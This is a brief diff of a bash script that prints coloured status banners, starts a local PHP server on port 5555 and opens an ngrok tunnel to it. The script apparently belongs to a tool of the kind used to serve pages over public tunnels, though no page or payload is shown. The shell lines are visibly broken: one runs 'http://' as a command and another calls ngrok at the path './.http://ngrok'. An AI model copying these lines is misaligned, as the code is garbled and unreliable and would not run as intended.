@@ -133,7 +133,7 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m
 sleep 1
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
-cd. http:// && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+http:// && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 ./.http://ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 7
